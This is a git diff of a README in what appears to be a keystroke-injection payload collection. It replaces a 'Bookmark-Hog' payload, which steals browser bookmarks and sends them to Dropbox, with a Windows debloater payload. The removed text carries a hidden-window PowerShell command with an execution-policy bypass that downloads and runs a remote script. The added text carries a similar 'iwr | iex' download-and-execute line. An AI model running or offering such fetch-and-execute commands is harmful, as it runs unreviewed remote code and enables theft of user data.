@@ -1,8 +1,6 @@
-<img src="https://github.com/atomiczsec/My-Payloads/blob/main/Assets/bm-hog.png?" width="200">
-
 <h1 align="center">
   <a href="https://git.io/typing-svg">
-    <img src="https://readme-typing-svg.herokuapp.com/?lines=Welcome+to+the;Bookmark+Hog!+😈&center=true&size=30">
+    <img src="https://readme-typing-svg.herokuapp.com/?lines=Welcome+to+;De-Bloater!+😈&center=true&size=30">
   </a>
 </h1>
 
@@ -19,43 +17,37 @@
   </ol>
 </details>
 
-# Bookmark-Hog
+# Water-UnMark
 
-A payload to exfiltrate bookmarks of the 2 most popular browsers
+A payload to quickly get "Windows10Debloater"
 
 ## Description
-
-This payload will enumerate through the browser directories, looking for the file that stores the bookmark history
-
-These files will be saved to the temp directory
-
-Finally dropbox will be used to exfiltrate the files to cloud storage
+This script will download "Windows10Debloater" - Script/Utility/Application to debloat Windows 10, to remove Windows pre-installed unnecessary applications, stop some telemetry functions, stop Cortana from being used as your Search Index, disable unnecessary scheduled tasks, and more...
 
 ## Getting Started
 
 ### Dependencies
 
-* DropBox or other file sharing service - Your Shared link for the intended file
-* Windows 10,11
+* Windows 10 
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ### Executing program
 
 * Plug in your device
-* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 ```
-powershell -w h -NoP -NonI -ep Bypass $pl = iwr < Your Shared link for the intended file> ?dl=1; iex $pl
+iwr -useb https://git.io/debloat|iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ## Contributing
 
-All contributors names will be listed here
+All contributors names will be listed here:
 
-atomiczsec
-I am Jakoby
+[atomiczsec](https://github.com/atomiczsec)
+[Sycnex](https://github.com/Sycnex/Windows10Debloater)
+[I am Jakoby](https://github.com/I-Am-Jakoby/Powershell-to-Ducky-Converter)
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -107,5 +99,7 @@ I am Jakoby
 
 * [Hak5](https://hak5.org/)
 * [I-Am-Jakoby](https://github.com/I-Am-Jakoby)
+* [Sycnex - Creator Of The Tool](https://github.com/Sycnex/Windows10Debloater)
+
 
 <p align="right">(<a href="#top">back to top</a>)</p>
